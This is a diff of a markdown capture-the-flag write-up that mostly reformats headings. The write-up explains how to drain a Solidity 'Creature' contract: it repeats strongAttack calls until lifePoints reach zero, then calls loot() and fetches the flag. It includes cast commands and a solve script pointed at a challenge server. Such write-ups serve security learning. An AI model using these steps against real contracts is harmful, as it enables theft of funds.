@@ -19,7 +19,7 @@ We are provided with two Solidity contracts, `Setup.sol` and `Creature.sol`. The
 
 ## Solution
 
-1. Find vulnerable function
+### 1. Find vulnerable function
 
 When looking through the `loot()` function, we can see something fishy. 
 ```solidity
@@ -34,7 +34,7 @@ But when lifePoints are 0, it will transfer the entire balance of the current co
 
 AKA, transfer us all of the money 😎
 
-2. Now we need to find a way for us to make our `lifePoints` to 0.
+### 2. Now we need to find a way for us to make our `lifePoints` to 0.
 
 This can be done with either the `punch()` function
 ```solidity
@@ -56,14 +56,14 @@ function _dealDamage(uint256 _damage) internal {
     }
 ```
 
-2. Check Initial Life Points
+### 3. Check Initial Life Points
 
 I will use the cast call command to check the initial life points of my wallet. We should have 20.
 ```bash
 cast call *targetadress* "lifePoints()" --rpc-url https://x.x.x.x/rpc
 ```
 
-3. Attack!!
+### 4. Attack!!
 
 Then to leak the flag we will make a loop that will run 20 times with using the `strongAttack` function where we set the `_damage` to 1, until we have a lifepoint of 0.  
 ```bash
@@ -72,7 +72,7 @@ for ((i=0; i<20; i++)); do
 done
 ```
 
-4. Loot the Creature
+### 5. Loot the Creature
 
 Once the creature's life points reach 0, we can use the loot function to obtain its balance.
 
@@ -80,12 +80,14 @@ Once the creature's life points reach 0, we can use the loot function to obtain 
 cast send *targetadress* "loot()" --rpc-url https://x.x.x.x/rpc --private-key *privatekey*
 ```
 
-5. Obtain the Flag
+### 6. Obtain the Flag
 Either go to your web browser and go to the `/flag` endpoing or use `curl` to retrieve the flag.
 
 ```bash
 curl -s "$url/flag"
 ```
+
+## My solvescript
 
 And the solution I made is this script where we just pass in the url, privatekey and target address as a variable.
 ```bash
@@ -106,6 +108,8 @@ cast send $target_adress "loot()" --rpc-url http://167.172.62.51:31520/rpc --pri
 curl -s "http://167.172.62.51:31520/flag"
 echo 
 ```
+
+### Individual commands
 
 But it could be narrowed down to these commands
 ```bash
